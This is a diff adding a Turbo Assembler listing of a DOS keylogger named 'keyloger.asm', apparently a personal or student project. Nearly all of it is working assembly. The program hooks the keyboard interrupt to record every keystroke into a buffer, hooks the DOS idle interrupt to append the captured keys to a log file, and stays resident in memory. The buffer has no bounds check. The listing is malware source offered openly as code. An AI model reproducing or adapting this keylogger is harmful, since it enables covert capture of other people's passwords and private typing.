@@ -1,0 +1,190 @@
+Turbo Assembler	 Version 4.1	    03/24/20 17:49:28	    Page 1
+keyloger.asm
+
+
+
+      1				     locals @@
+      2	0000			     .model tiny
+      3
+      4	0000			     .code
+      5				     org 100h
+      6
+      7	0100			     Start:
+      8	0100  B4 35				 mov ah, 35h
+      9	0102  B0 09				 mov al, 09h
+     10	0104  CD 21				 int 21h
+     11	0106  89 1E 0000r			 mov word ptr sysHandler09, bx
+     12	010A  8C 06 0002r			 mov word ptr sysHandler09 + 2,	es
+     13
+     14	010E  B4 25				 mov ah, 25h
+     15	0110  B0 09				 mov al, 09h
+     16	0112  BA 013Fr				 mov dx, offset	NewKeyboardInt
+     17	0115  CD 21				 int 21h
+     18
+     19	0117  B4 35				 mov ah, 35h
+     20	0119  B0 28				 mov al, 28h
+     21	011B  CD 21				 int 21h
+     22	011D  89 1E 0004r			 mov word ptr sysHandler28, bx
+     23	0121  8C 06 0006r			 mov word ptr sysHandler28 + 2,	es
+     24
+     25	0125  B4 25				 mov ah, 25h
+     26	0127  B0 28				 mov al, 28h
+     27	0129  BA 0178r				 mov dx, offset	clearFileWrite
+     28	012C  CD 21				 int 21h
+     29
+     30	012E  B8 3100				 mov ax, 3100h
+     31	0131  BA 012Br				 mov dx, offset	EndInt
+     32	0134  D1 EA D1 EA D1 EA	D1+		 shr dx, 4
+     33	      EA
+     34	013C  42				 inc dx
+     35	013D  CD 21				 int 21h
+     36
+     37				     ;=============================================================
+     38				     ;Keyboard interrupt
+     39				     ;Get symbol
+     40				     ;=============================================================
+     41	013F			     NewKeyboardInt proc
+     42	013F  9C				 pushf
+     43	0140  2E: FF 1E	0000r			 call cs:sysHandler09
+     44	0145  50 53 51 57 06			 push ax bx cx di es
+     45
+     46	014A  B4 01				 mov ah, 01h		 ;read symbol
+     47	014C  CD 16				 int 16h
+     48
+     49	014E  74 12				 jz @@skip		 ;skip,	if no symbol
+     50
+     51	0150  BB 0008r				 mov bx, offset	buffer
+     52	0153  2E: 8B 0E	0108r			 mov cx, cs:[bufferPos]
+     53	0158  03 D9				 add bx, cx
+     54	015A  2E: 88 07				 mov cs:[bx], al
+     55	015D  2E: FF 06	0108r			 inc cs:[bufferPos]
+     56
+     57	0162			     @@skip:
+Turbo Assembler	 Version 4.1	    03/24/20 17:49:28	    Page 2
+keyloger.asm
+
+
+
+     58	0162  E4 61				 in al,	61h
+     59	0164  8A E0				 mov ah, al
+     60	0166  0C 80				 or al,	80h
+     61	0168  E6 61				 out 61h, al
+     62	016A  86 E0				 xchg ah, al
+     63	016C  E6 61				 out 61h, al
+     64
+     65	016E  B0 20				 mov al, 20h
+     66	0170  E6 20				 out 20h, al
+     67
+     68	0172  07 5F 59 5B 58			 pop es	di cx bx ax
+     69	0177  CF				 iret
+     70	0178					 endp
+     71
+     72				     ;=====================================================
+     73				     ;int 28h
+     74				     ;write file
+     75				     ;=====================================================
+     76	0178			     clearFileWrite proc
+     77	0178  9C				 pushf
+     78	0179  2E: FF 1E	0004r			 call cs:sysHandler28
+     79	017E  50 53 51 52 1E			 push ax bx cx dx ds
+     80
+     81	0183  83 3E 0108r 00			 cmp bufferPos,	0
+     82	0188  74 3E				 je @@skip
+     83
+     84	018A  2E: FF 36	0108r			 push cs:[bufferPos]
+     85
+     86	018F  8C C8				 mov ax, cs
+     87	0191  8E D8				 mov ds, ax
+     88
+     89	0193  B4 3D				 mov ah, 3dh		     ;open file
+     90	0195  B0 01				 mov al, 1
+     91	0197  BA 010Ar				 mov dx, offset	logPath
+     92	019A  CD 21				 int 21h
+     93
+     94	019C  8B D8				 mov bx, ax		     ;move handle
+     95
+     96	019E  B4 42				 mov ah, 42h		     ;fseek
+     97	01A0  B0 02				 mov al, 2
+     98	01A2  B9 0000				 mov cx, 0
+     99	01A5  BA 0000				 mov dx, 0
+    100	01A8  CD 21				 int 21h
+    101
+    102	01AA  B4 40				 mov ah, 40h		     ;write file
+    103	01AC  2E: 8B 0E	0108r			 mov cx, cs:[bufferPos]
+    104	01B1  BA 0008r				 mov dx, offset	buffer
+    105	01B4  CD 21				 int 21h
+    106
+    107	01B6  B4 3E				 mov ah, 3eh		     ;close file
+    108	01B8  CD 21				 int 21h
+    109
+    110	01BA  58				 pop ax
+    111	01BB  2E: 3B 06	0108r			 cmp ax, cs:[bufferPos]
+    112	01C0  75 06				 jne @@skip
+    113
+    114	01C2  C7 06 0108r 0000			 mov bufferPos,	0
+Turbo Assembler	 Version 4.1	    03/24/20 17:49:28	    Page 3
+keyloger.asm
+
+
+
+    115
+    116	01C8			     @@skip:
+    117	01C8  1F 5A 59 5B 58			 pop ds	dx cx bx ax
+    118	01CD  CF				 iret
+    119	01CE					 endp
+    120
+    121	01CE			     .data
+    122	0000  ????????		     sysHandler09  dd ?
+    123	0004  ????????		     sysHandler28  dd ?
+    124	0008  0100*(00)		     buffer	 db 256d dup (0)
+    125	0108  0000		     bufferPos	 dw 0
+    126	010A  73 3A 5C 64 6F 63	5C+  logPath	 db "s:\doc\projects\keyloger\key.log",	0
+    127	      70 72 6F 6A 65 63	74+
+    128	      73 5C 6B 65 79 6C	6F+
+    129	      67 65 72 5C 6B 65	79+
+    130	      2E 6C 6F 67 00
+    131
+    132	012B			     EndInt:
+    133				     end Start
+Turbo Assembler	 Version 4.1	    03/24/20 17:49:28	    Page 4
+Symbol Table
+
+
+
+
+Symbol Name			  Type	 Value
+
+??DATE				  Text	 "03/24/20"
+??FILENAME			  Text	 "keyloger"
+??TIME				  Text	 "17:49:28"
+??VERSION			  Number 040A
+@32BIT				  Text	 0
+@@SKIP				  Near	 DGROUP:0162
+@@SKIP				  Near	 DGROUP:01C8
+@CODE				  Text	 DGROUP
+@CODESIZE			  Text	 0
+@CPU				  Text	 0101H
+@CURSEG				  Text	 _DATA
+@DATA				  Text	 DGROUP
+@DATASIZE			  Text	 0
+@FILENAME			  Text	 KEYLOGER
+@INTERFACE			  Text	 000H
+@MODEL				  Text	 1
+@STACK				  Text	 DGROUP
+@WORDSIZE			  Text	 2
+BUFFER				  Byte	 DGROUP:0008
+BUFFERPOS			  Word	 DGROUP:0108
+CLEARFILEWRITE			  Near	 DGROUP:0178
+ENDINT				  Near	 DGROUP:012B
+LOGPATH				  Byte	 DGROUP:010A
+NEWKEYBOARDINT			  Near	 DGROUP:013F
+START				  Near	 DGROUP:0100
+SYSHANDLER09			  Dword	 DGROUP:0000
+SYSHANDLER28			  Dword	 DGROUP:0004
+
+Groups & Segments		  Bit Size Align  Combine Class
+
+DGROUP				  Group
+  _DATA				  16  012B Word	  Public  DATA
+  _TEXT				  16  01CE Word	  Public  CODE
+
